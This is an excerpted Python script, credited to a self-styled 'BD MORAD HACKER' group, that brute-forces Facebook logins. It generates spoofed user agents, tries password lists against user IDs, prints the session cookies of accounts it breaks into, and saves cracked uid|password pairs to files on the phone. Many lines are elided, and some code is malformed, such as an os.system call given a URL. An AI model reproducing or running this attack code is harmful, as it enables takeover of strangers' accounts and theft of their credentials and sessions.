# NAME : ⸨⸙⸩⟬𝐊𝐈𝐍𝐆 - 𝐌𝐎𝐑𝐀𝐃⟭⸨⸙⸩
# FACEBOOK  : https://www.facebook.com/profile.php?id=61550325485961
# FB GROUP : BD MORAD HACKER TEM
# FB ID : KING MORAD
...
for ua in range(5000):
    ...
    l='.0'
    MORAD=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(MORAD)
...
def Main():
        ...
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        MORAD =input("\n \033[1;35m[😁\033[1;35m] \033[1;32mSELECTED YOUR OPTION : https://www.facebook.com/profile.php?id=61550325485961")
        if MORAD in ["1","01"]:
            sexy()
        if MORAD in ["2","02"]:
...
def sexy():
    user=[]
    os.system('https://www.facebook.com/profile.php?id=100084311672521')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK BHH-MORAD-OK.txt')
    print(' [😁] CP BHH-MORAD-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[BHH-MORAD-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mBHH-MORAD-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😜] MORAD :\033[1;95m {coki}")
                open('/sdcard/BHH-MORAD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mBHH-MORAD-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/BHH-MORAD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
